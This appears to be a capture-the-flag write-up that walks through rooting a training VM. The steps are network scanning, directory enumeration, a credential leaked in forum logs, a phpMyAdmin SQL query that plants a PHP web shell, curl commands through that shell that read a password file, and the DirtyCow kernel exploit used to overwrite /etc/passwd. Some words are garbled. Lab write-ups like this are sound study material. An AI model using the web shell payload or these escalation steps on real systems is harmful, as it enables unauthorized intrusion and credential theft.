# writeup1
After running the VM, it wants us to login, but we don't have login and password so we are going to use the **netdiscover** tool in our computer, which will return us all of the IP addresses that we currently have in our network, except the one for our machine. Writing the following command․
```
netdiscover -r 192.168.1.0/24 #-r flag is the range of ips, and how did we know about /24, when we do ip a we’ll see our ip address, which ends with /24
```
And as a result we see the following:
```
Currently scanning: Finished!   |   Screen View: Unique Hosts

 11 Captured ARP Req/Rep packets, from 5 hosts.   Total size: 498
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname
 -----------------------------------------------------------------------------
 192.168.1.1     e8:01:8d:27:a7:00      5     210  Fiberhome Telecommunication
 192.168.1.3     c8:3a:35:36:91:18      1      60  Tenda Technology Co., Ltd.
 192.168.1.2     d8:af:81:0f:42:36      1      60  AO
 192.168.1.12    08:00:27:45:1c:86      2      84  PCS Systemtechnik GmbH
 192.168.1.6     32:4c:46:b9:8e:42      2      84  Unknown vendor
```

The first one is my router,
the second one is my other route,
the third one is my TV,
and the fourth one I don't know yet. Let's go to the browser and investigate it.
<img src="img/Pasted image 20240704110727.png">
Well, I think we found the IP address of our machine, but it's so empty att first glance. It is worth to check and parse the directories, to see what is there:

For that we can use the **dirb** tool.
```
┌──(neo㉿matrix)-[~]
└─$ dirb http://192.168.1.12/

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Thu Jul  4 11:13:15 2024
URL_BASE: http://192.168.1.12/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.1.12/ ----
+ http://192.168.1.12/cgi-bin/ (CODE:403|SIZE:288)
==> DIRECTORY: http://192.168.1.12/fonts/
+ http://192.168.1.12/forum (CODE:403|SIZE:285)
+ http://192.168.1.12/index.html (CODE:200|SIZE:1025)
+ http://192.168.1.12/server-status (CODE:403|SIZE:293)

---- Entering directory: http://192.168.1.12/fonts/ ----
(!) WARNING: Directory IS LISTABLE. No need to scan it.
    (Use mode '-w' if you want to scan it anyway)

-----------------
END_TIME: Thu Jul  4 11:13:19 2024
DOWNLOADED: 4612 - FOUND: 4
```
We see that there is a /forum whose status code is 403 (fprnoddem) because we only scanned with https, let's try with https. and while this happend, we can already enter the forum with https։
<img src="img/Pasted image 20240704112010.png">
While we investigating all this, we can get **nmap** working for our ip.
**nmap** is a tool, that scans open ports of the given ip, and gives information about them. We should have done this in the beginning, but I'm an old man and I forgot.
```
sudo nmap 192.168.1.12 -sS -sV -sC -v &>out
```
While scanning, On the page 'Problem login; we see interesting logs, that lmezard use wants to login and it doesn't work, and if we search that username using the functions of the browser, we'll see this:
<img src="img/Pasted image 20240704112903.png">
We can see from these logs that this user naively wrote his password as a username and failed.

there is a place on the site to login, let's try it
<img src="img/Pasted image 20240704113729.png">
And great, we logged in and there was also webmail in the output of **dirb**
<img src="img/Pasted image 20240704114314.png">
lmezard isn't logged in, but if we look at our user's email from our forum, we'll see this
<img src="img/Pasted image 20240704120557.png">
We successfully login with this email, and we can see an interesting message here
<img src="img/Pasted image 20240704120634.png">
and whenever we go to phpadmin
<img src="img/Pasted image 20240704120741.png">
we'll be able to log in with the password given by this email

and here we have the possibility to write sql code, and after suffering for 40 years and asking people in slack, I realized that we have permission in the templates_c folder, so we will run the following:
```
SELECT 1, '<?php system($_GET["cmd"]." 2>&1"); ?>' INTO OUTFILE '/var/www/forum/templates_c/gago.php'
```
<img src="img/Pasted image 20240704122427.png">
And here we got this

Now let's see what's here
```
┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20%20/home'
1	LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home'
1	.
..
LOOKATME
ft_root
laurie
laurie@borntosec.net
lmezard
thor
zaz

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME'
1	.
..
password

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=ls%20-a%20/home/LOOKATME/password'
1	/home/LOOKATME/password

┌──(neo㉿matrix)-[~]
└─$ curl --insecure 'https://192.168.1.12/forum/templates_c/gago.php?cmd=cat%20/home/LOOKATME/password'
1	lmezard:G!@M6f4Eatau{sF"

```
unfortunately, we cannot login with ssh with this login and password, but we can do it with VM
<img src="img/Pasted image 20240712001204.png">
Let's do uname -a to see what kernel it s, because this iso file is a bit younger that my grandma
<img src="img/Pasted image 20240712001336.png">
and after a little googgling **linux 3.2 cve**  I cam across this link https://www.cybersecurity-help.cz/exploits/1039/?ref=bulletin and found this exploit from github https://github.com/firefart/dirtycowv. We don't have git to clone it, bu we have 2 nostril.

We go to tmp and download the file using curl
```
cd /tmp
curl https://raw.githubusercontent.com/firefart/dirtycow/master/dirty.c > dirty.c
```
The way to use the exploit is written in  a file

// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
//   The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
//   https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
//   gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
//   "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
//   mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at

Let's compile and run it
<img src="img/Pasted image 20240712004026.png">
I think it worked! Let's try to login. As the script changes a username, I'll edit the script and put with root in my files,  so that you don't say that you aren't root, regardless of the fact that the ID is 0:
<img src="img/Pasted image 20240712004305.png">
And you can congratulate me, we have root.

<img src="img/Pasted image 20240712011419.png">
And here is the changed code, which is in the /scripts folder
